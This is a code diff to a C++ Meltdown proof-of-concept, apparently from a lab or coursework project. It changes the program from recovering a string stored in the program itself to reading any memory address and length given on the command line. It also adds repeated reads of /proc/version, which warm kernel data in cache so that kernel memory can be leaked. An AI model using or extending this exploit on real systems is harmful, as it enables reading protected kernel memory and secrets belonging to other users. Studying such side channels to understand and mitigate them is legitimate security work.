@@ -6,20 +6,19 @@
 #include <climits>
 #include <csignal>
 #include <csetjmp>
+#include <unistd.h>
 #include <string>
+#include <fcntl.h>
 #include <x86intrin.h>
 
 constexpr unsigned page_size = 4096;
 constexpr unsigned possible_value_nums = 256;
 constexpr int max_num_predicts = 100;
 
-static constexpr char* secret = (char *) "To be or not to be is a question.";
-static const int secret_len = strlen(secret);
 static uint8_t *cache;
-
 static std::vector<int> probe_sequence;
-
 static jmp_buf jmp_buffer;
+static int fd;
 
 typedef void handler_t(int);
 
@@ -35,7 +34,7 @@ static void __attribute__((noinline)) meltdown_attack(char* addr);
 handler_t *Signal(int signum, handler_t *handler);
 void unix_error(char *msg);
 
-int main()
+int main(int argc, char *argv[])
 {
     init_probe_sequence();
     cache = (uint8_t *) aligned_alloc(page_size, page_size * possible_value_nums);
@@ -43,11 +42,20 @@ int main()
     std::vector<int> count(256, 0);
     std::string secret_recovered;
 
-    char* addr = secret;
+    unsigned long addr_input;
+    unsigned long size;
+
+    sscanf(argv[1], "%lx", &addr_input);
+    sscanf(argv[2], "%lx", &size);
+    
+    char *addr = (char *) addr_input;
+
+    if ((fd = open("/proc/version", O_RDONLY)) < 0)
+        unix_error((char *) "failed to open /proc/version");
 
     Signal(SIGSEGV, sigsegv_handler);
     
-    for (int i = 0; i != secret_len; ++i)
+    for (int i = 0; i != (int) size; ++i)
     {
         count.assign(256, 0);
         for (int j = 0; j != max_num_predicts; ++j)
@@ -88,7 +96,10 @@ static inline void mem_access(void *p)
 
 int read_byte(char* addr)
 {
+    static char buf[256];
     memset(cache, 0, page_size * possible_value_nums);
+    if (pread(fd, buf, sizeof(buf), 0) < 0)
+        unix_error((char *) "pread failed");
     flush_cache();
     meltdown_attack(addr);
     return recover_secret();
@@ -161,7 +172,7 @@ handler_t *Signal(int signum, handler_t *handler)
     action.sa_flags = SA_INTERRUPT; /* restart syscalls if possible */
 
     if (sigaction(signum, &action, &old_action) < 0)
-        unix_error((char *)"Signal error");
+        unix_error((char *) "Signal error");
     return (old_action.sa_handler);
 }
 
